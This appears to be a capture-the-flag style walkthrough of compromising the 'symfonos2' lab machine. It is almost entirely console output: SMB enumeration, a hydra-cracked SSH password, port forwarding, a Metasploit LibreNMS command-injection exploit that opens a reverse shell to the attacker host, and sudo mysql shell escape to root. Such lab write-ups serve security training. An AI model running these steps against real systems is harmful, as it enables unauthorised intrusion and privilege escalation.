
SMB service ==> collect usename aeolus =>  Brute force ftp/ssh service ==> Gain access ssh 
==> ping port ==> port forwarding ==> exploit libre librenms ==> Gain cronus access
==> Execute sudo /usr/bin/mysql -e '\! /bin/sh' to gain root shell




```console
$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.47
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 11:05 CEST
Nmap scan report for 192.168.110.47
Host is up (0.00055s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:4E:03:8A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h39m57s, deviation: 2h53m12s, median: 1h59m57s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2021-09-16T06:05:52-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-16T11:05:52
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 192.168.110.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```


```console

# cat logs.txt
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes

User           aeolus
Group          aeolus

```

hydra 

aeolus:sergioteamo


```console

for i in $(seq 1 65535); do nc -z -v 127.0.0.1 $i 2>&1 | grep 'open'; done

```

```console

ssh -N -f -L 8080:127.0.0.1:8080 aeolus@192.168.110.47

```

we can login with aeolus:sergioteamo to LibreNMS at http://127.0.0.1:8080


```console

msf6 > search  LibreNMS

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/linux/http/librenms_collectd_cmd_inject  2019-07-15       excellent  Yes    LibreNMS Collectd Command Injection
   1  exploit/linux/http/librenms_addhost_cmd_inject   2018-12-16       excellent  No     LibreNMS addhost Command Injection

msf6 > use exploit/linux/http/librenms_addhost_cmd_inject
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set PASSWORD sergioteamo
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set USERNAME aeolus
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set RHOSTS 127.0.0.1
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set RPORT 8080
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > set LHOST 192.168.110.1
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run
[*] Started reverse TCP double handler on 192.168.110.1:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname JrnuPURrFH
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[+] Successfully deleted device with hostname JrnuPURrFH and id #1
[*] Command: echo ABfCnWhLVhy3ua9H;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "Trying: not found\r\nsh: 2: Connected: not found\r\nsh: 3: Escape: not found\r\nABfCnWhLVhy3ua9H\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.110.1:4444 -> 192.168.110.47:45462) at 2021-09-16 12:22:58 +0200

id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql

sudo /usr/bin/mysql -e '\! /bin/sh'
id
uid=0(root) gid=0(root) groups=0(root)

```


```console

msf6 >use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.110.47
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME aeolus
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD sergioteamo
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.110.47:22 - Starting bruteforce
[+] 192.168.110.47:22 - Success: 'aeolus:sergioteamo' 'uid=1000(aeolus) gid=1000(aeolus) groups=1000(aeolus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev) Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.168.110.1:41999 -> 192.168.110.47:22) at 2021-09-16 12:52:04 +0200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information                                 Connection
  --  ----  ----         -----------                                 ----------
  1         shell linux  SSH aeolus:sergioteamo (192.168.110.47:22)  192.168.110.1:41999 -> 192.168.110.47:22 (192
                                                                     .168.110.47)

msf6 auxiliary(scanner/ssh/ssh_login) > use post/multi/manage/shell_to_meterpreter 
msf6 post(multi/manage/shell_to_meterpreter) > set LPORT 443
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.110.1:443 
[*] Sending stage (984904 bytes) to 192.168.110.47
[*] Meterpreter session 2 opened (192.168.110.1:443 -> 192.168.110.47:57968) at 2021-09-16 12:53:04 +0200
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information                             Connection
  --  ----  ----                   -----------                             ----------
  1         shell linux            SSH aeolus:sergioteamo (192.168.110.47  192.168.110.1:41999 -> 192.168.110.47:2
                                   :22)                                    2 (192.168.110.47)
  2         meterpreter x86/linux  aeolus @ symfonos2 (uid=1000, gid=1000  192.168.110.1:443 -> 192.168.110.47:579
                                   , euid=1000, egid=1000) @ 192.168.110.  68 (192.168.110.47)
                                   47

```